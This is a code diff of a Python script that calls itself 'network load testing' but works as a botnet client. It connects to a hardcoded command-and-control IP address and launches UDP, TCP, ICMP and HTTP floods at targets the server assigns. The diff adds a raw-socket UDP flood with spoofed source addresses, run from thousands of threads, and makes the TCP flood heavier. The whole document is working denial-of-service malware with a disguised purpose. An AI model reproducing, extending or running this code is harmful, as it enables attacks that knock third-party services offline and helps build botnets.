@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 import socket,json,threading,time,sys,multiprocessing as mp,struct,ssl,random
 from urllib.parse import urlparse
-S="167.88.166.167";P=4445
+S="144.172.94.208";P=2016
 UA=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101']
 print("network load testing ")
 def wu(i,p,d,e,q):
@@ -23,13 +23,69 @@ def wu(i,p,d,e,q):
    c+=1000
   except:0
  s.close();q.put(c)
+def wub(i,p,d,e,q):
+ raw=0
+ try:
+  s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_UDP)
+  s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
+  raw=1
+ except:
+  s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+ try:s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912)
+ except:0
+ s.setblocking(0);c=0;dipb=socket.inet_aton(i)
+ def iph(sip,dip,udplen):
+  vhl=0x45;tos=0;iplen=20+udplen;id=random.randint(1,65535);fl=0;ttl=64;pr=17
+  sipb=socket.inet_aton(sip)
+  ph=sipb+dipb+b'\x00'+bytes([pr])+struct.pack('!H',udplen)
+  ch=sum(struct.unpack('!10H',ph))&0xffff
+  ch=(ch>>16)+(ch&0xffff);ch=~ch&0xffff
+  return struct.pack('!BBHHHBBH4s4s',vhl,tos,iplen,id,fl,ttl,pr,ch,sipb,dipb)
+ def udph(sp,dp,pl):
+  sp=random.randint(1024,65535)
+  udplen=8+pl;chk=0
+  return struct.pack('!HHHH',sp,dp,udplen,chk)
+ while time.time()<e:
+  try:
+   sip=f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+   pl=len(d);udp=udph(0,p,pl);udplen=8+pl
+   if raw:
+    ip=iph(sip,i,udplen);pkt=ip+udp+d;f=s.sendto;f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
+   else:
+    t=(i,p);f=s.sendto;f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
+   c+=100
+  except:0
+ s.close();q.put(c)
 def wt(i,p,d,e,q):
  c=0
  while time.time()<e:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912)
-   s.settimeout(2);s.connect((i,p));f=s.send
+   try:s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
+   except:0
+   s.settimeout(2)
+   try:s.connect((i,p))
+   except:continue
+   f=s.sendall
    while time.time()<e:
     try:
      f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
@@ -42,9 +98,14 @@ def wt(i,p,d,e,q):
      f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
      f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
      f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
-     c+=500
+     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
+     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
+     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
+     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
+     c+=750
     except:break
-   s.close()
+   try:s.close()
+   except:0
   except:0
  q.put(c)
 def ck(d):
@@ -106,6 +167,14 @@ def atk_udp(i,p,d,z):
  c=0
  while not q.empty():c+=q.get()
  print(f"[+]{c:,}pkt {c//d:,}pps")
+def atk_udp_bypass(i,p,d,z):
+ n=3000;z=min(z,65507)if z>0 else 1024;x=b'X'*z;e=time.time()+d;q=mp.Queue();th=[]
+ print(f"[UDP-BYPASS]{i}:{p} {d}s {n}th sz:{z}")
+ for _ in range(n):t=threading.Thread(target=wub,args=(i,p,x,e,q),daemon=1);t.start();th.append(t)
+ for t in th:t.join()
+ c=0
+ while not q.empty():c+=q.get()
+ print(f"[+]{c:,}pkt {c//d:,}pps")
 def atk_tcp(i,p,d,z):
  n=3000;z=min(z,65507)if z>0 else 1024;x=b'X'*z;e=time.time()+d;q=mp.Queue();th=[]
  print(f"[TCP]{i}:{p} {d}s {n}th sz:{z}")
@@ -144,11 +213,13 @@ def bot():
  while 1:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(30);s.connect((S,P))
-   s.sendall(json.dumps({"type":"register","status":"ready"}).encode()+b'\n');buf=""
+   s.sendall(json.dumps({"type":"register","status":"ready","methods":["UDP","TCP","ICMP","HTTP","UDP-BYPASS"],"version":"v2"}).encode()+b'\n');buf=""
    while 1:
     try:
-     r=s.recv(4096).decode()
+     r=s.recv(4096)
      if not r:break
+     try:r=r.decode('utf-8',errors='ignore')
+     except:continue
      buf+=r
      while '\n'in buf:
       l,buf=buf.split('\n',1)
@@ -160,6 +231,7 @@ def bot():
         if m=='TCP':threading.Thread(target=atk_tcp,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
         elif m=='ICMP':threading.Thread(target=atk_icmp,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
         elif m=='HTTP':threading.Thread(target=atk_http,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
+        elif m=='UDP-BYPASS':threading.Thread(target=atk_udp_bypass,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
         else:threading.Thread(target=atk_udp,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
         s.sendall(json.dumps({"type":"ack","bot_id":b,"status":"ok","command_id":c.get('command_id')}).encode()+b'\n')
        elif c.get('type')=='assign_id':b=c.get('bot_id')
